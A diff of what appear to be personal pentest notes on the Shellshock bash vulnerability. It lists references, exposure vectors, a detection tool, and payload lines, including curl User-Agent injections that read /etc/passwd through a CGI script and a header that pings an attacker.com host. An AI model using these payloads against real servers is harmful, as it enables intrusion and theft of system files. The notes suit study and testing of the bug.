@@ -9,8 +9,10 @@ http://bash.cumulonim.biz/BashPitfalls.html
 - https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
 - http://lcamtuf.blogspot.com.es/2014/09/quick-notes-about-bash-bug-its-impact.html
 - http://www.dwheeler.com/essays/shellshock.html#timeline
-This means that web apps written in languages such as PHP, Python, C++, or Java, are likely to be vulnerable if they ever use libcalls such as popen() or system(), all of which are backed by calls to /bin/sh -c '...'. There is also some added web-level exposure through #!/bin/sh CGI scripts, <!--#exec cmd="..."> calls in SSI, and possibly more exotic vectors such as mod_ext_filter.
-For the same reason, userland DHCP clients that invoke configuration scripts and use variables to pass down config details are at risk when exposed to rogue servers (e.g., on open wifi). Finally, there is some exposure for environments that use restricted SSH shells (possibly including Git) or restricted sudo commands, but the security of such approaches is typically fairly modest to begin with.
+This means that web apps written in languages such as PHP, Python, C++, or Java, are likely to be vulnerable if they ever use libcalls such as popen() or system(), all of which are backed by calls to /bin/sh -c '...'.
+There is also some added web-level exposure through #!/bin/sh CGI scripts, <!--#exec cmd="..."> calls in SSI, and possibly more exotic vectors such as mod_ext_filter.
+For the same reason, userland DHCP clients that invoke configuration scripts and use variables to pass down config details are at risk when exposed to rogue servers (e.g., on open wifi).
+Finally, there is some exposure for environments that use restricted SSH shells (possibly including Git) or restricted sudo commands, but the security of such approaches is typically fairly modest to begin with.
 
 * detection
 https://github.com/hannob/bashcheck
@@ -29,7 +31,6 @@ env x='() { :;}; echo vuln' bash -c "thiscommanddoesntexist"
 ssh -o 'rsaauthentication yes’ 192.168.1.1 '() { ignored; }; id'
 User-Agent: () { :;}; ping bbug.d2t.attacker.com
 
-+ bashbug scenarios
 * http cgi
 curl -A '() { :;};echo;/bin/cat /etc/passwd' http://192.168.0.1/poc.cgi
 curl -A '() { :;};/bin/cat /etc/passwd>dumped_file' http://192.168.0.1/poc.cgi # if STDOUT doesnt work
